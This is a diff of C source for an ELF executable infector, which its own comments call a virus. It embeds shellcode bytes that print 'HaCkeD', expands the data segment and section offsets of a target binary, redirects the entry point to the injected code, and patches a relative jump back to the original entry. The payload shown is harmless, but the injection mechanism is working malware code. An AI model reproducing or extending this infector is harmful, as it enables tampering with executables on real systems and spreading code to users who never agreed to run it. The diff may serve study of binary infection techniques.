@@ -6,20 +6,14 @@
 #include <stdio.h>
 #include <string.h>
 
-/*mov rax, 0x030A44656b436148*/
-/*push rax*/
-/*lea rsi, [rsp]*/
-/*mov rax, 1*/
-/*mov rdi, 1*/
-/*mov rdx, 7*/
-/*syscall*/
+char code2[40] = {
+	0x52,0x48,0xb8,0x48,0x61,0x43,0x6b,0x65,0x44,0x0a,
+	0x03,0x50,0x48,0x8d,0x34,0x24,0xb8,0x01,0x00,0x00,
+	0x00,0xbf,0x01,0x00,0x00,0x00,0xba,0x07,0x00,0x00,
+	0x00,0x0f,0x05,0x58,0x5a,0xe9
+};
 
-char code2[44] = {	0x48,0xB8,0x48,0x61,0x43,0x6B,0x65,0x44,0x0A,0x03,0x50,
-					0x48,0x8D,0x34,0x24,0xB8,0x01,0x00,0x00,0x00,0xBF,0x01,
-					0x00,0x00,0x00,0xBA,0x07,0x00,0x00,0x00,0x0F,0x05,0x00,
-					0xE9};
-
-int codeLen = 34;
+int codeLen = 36;
 
 void	debug_code() {
 	int i = 0;
@@ -41,22 +35,18 @@ int		main(int argc, char **argv) {
 	Elf64_Phdr *Phdr = NULL;
 	Elf64_Shdr *Shdr = NULL;
 
+	codeLen += 4; // FOR ADDR LATER
+
 	// ENTRY HEADER
 	read(fd, buffer, sizeof(Elf64_Ehdr));
 	Ehdr = (Elf64_Ehdr *)buffer;
 	structNum = Ehdr->e_phnum;
 	printf("Entry point: %lx\n", Ehdr->e_entry);
 
-	// SAVE SECTION INFORMATIONS FOR LATER (edit .bss section)
+	// SAVE SECTION INFORMATIONS FOR LATER
 	uint64_t shdr_start = Ehdr->e_shoff;
 	uint16_t shnum = Ehdr->e_shnum;
-
-	// REDIRECT OUR VIRUS CODE TO EXECUTABLE ENTRY POINT
-	void *addr = &code2;
-	addr += codeLen;
-	codeLen += 8;
-	*(uint64_t *)addr = Ehdr->e_entry;
-	debug_code();
+	uint64_t host_entry = Ehdr->e_entry;
 
 	// INCREMENT SECTION OFFSET BY CODE LEN
 	Ehdr->e_shoff += codeLen;
@@ -74,7 +64,7 @@ int		main(int argc, char **argv) {
 	while (i < structNum) {
 		Phdr = (Elf64_Phdr *)buffer + i;
 		phdr_offset = phdr_start + ((uint64_t)Phdr - (uint64_t)&buffer);
-		printf("Found segment number: %d at file offset: 0x%lx\n", i, Phdr->p_offset);
+		// printf("Found segment number: %d at file offset: 0x%lx\n", i, Phdr->p_offset);
 		// printf("Segment check %lx > %lx\n", Phdr->p_offset, injected_address);
 		if (injected_address > 0 && Phdr->p_offset > injected_address) {
 			// printf("Incrementing Segment\n");
@@ -99,7 +89,16 @@ int		main(int argc, char **argv) {
 			uint64_t tmp = Phdr->p_vaddr + Phdr->p_filesz;
 			printf("Set entry point: %lx\n", tmp);
 			write(fd, &tmp, sizeof(uint64_t));
-			// write(fd, &injected_address, 8);
+
+			// REDIRECT OUR VIRUS CODE TO HOST ENTRY POINT
+			void *addr = &code2;
+			addr += codeLen - 4;
+			uint32_t difference = tmp - host_entry;
+			printf("Difference = %x - %x = %x\n", tmp, host_entry, difference);
+			difference += codeLen;
+			difference *= -1; // FOR NEGATIVE REL JUMP
+			*(uint32_t *)addr = difference;
+			debug_code();
 
 			// INCREASE DATA SEG SIZE, MEMSZ & FILESZ BY SIZE OF OUR VIRUS
 			Phdr->p_filesz += codeLen;
@@ -135,9 +134,9 @@ int		main(int argc, char **argv) {
 	while (i < shnum) {
 		Shdr = (Elf64_Shdr *)buffer + i;
 		shdr_offset = shdr_start + ((uint64_t)Shdr - (uint64_t)&buffer);
-		printf("Found section number: %d at file offset: 0x%lx\n", i, Shdr->sh_offset);
+		// printf("Found section number: %d at file offset: 0x%lx\n", i, Shdr->sh_offset);
 		if (Shdr->sh_type == SHT_NOBITS) {
-			printf("Found .bss section\n");
+			// printf("Found .bss section\n");
 
 			// MUST CHANGE .data sh_flag to WAX ? (set bit SHF_EXECINSTR to 1) USELESS ?
 			/*Shdr = (Elf64_Shdr *)buffer + (i - 1);*/
